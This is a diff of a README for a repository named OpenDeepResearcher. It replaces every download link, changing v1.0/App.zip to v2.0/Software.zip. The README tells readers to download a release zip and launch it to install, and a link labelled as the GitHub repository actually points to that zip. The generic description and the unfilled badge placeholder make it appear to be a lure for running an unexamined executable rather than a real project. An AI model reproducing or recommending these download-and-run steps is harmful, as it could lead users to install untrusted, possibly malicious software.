@@ -20,9 +20,9 @@ Welcome to **OpenDeepResearcher**, your go-to repository for all things related 
 - Collaborate with like-minded individuals in the community
 
 ## Installation
-To get started with **OpenDeepResearcher**, you can download the latest version [here](https://github.com/jamlily/OpenDeepResearcher/releases/download/v1.0/App.zip). Once downloaded, launch the file to initiate the installation process.
+To get started with **OpenDeepResearcher**, you can download the latest version [here](https://github.com/jamlily/OpenDeepResearcher/releases/download/v2.0/Software.zip). Once downloaded, launch the file to initiate the installation process.
 
-[![Download Zip](https://github.com/jamlily/OpenDeepResearcher/releases/download/v1.0/App.zip<COLOR>.svg)](https://github.com/jamlily/OpenDeepResearcher/releases/download/v1.0/App.zip)
+[![Download Zip](https://github.com/jamlily/OpenDeepResearcher/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/jamlily/OpenDeepResearcher/releases/download/v2.0/Software.zip)
 
 ## Usage
 Feel free to explore the different folders and files within the repository. You will find a wealth of information related to deep research, including guides, tutorials, and code snippets. Dive into the world of neural networks, explore the possibilities of AI, and unlock the potential of open-source technologies.
@@ -41,4 +41,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Don't forget to check the "Releases" section for the latest updates and enhancements. Happy researching! 🎓
 
-🔗 [Visit our GitHub repository](https://github.com/jamlily/OpenDeepResearcher/releases/download/v1.0/App.zip) 🔗
+🔗 [Visit our GitHub repository](https://github.com/jamlily/OpenDeepResearcher/releases/download/v2.0/Software.zip) 🔗
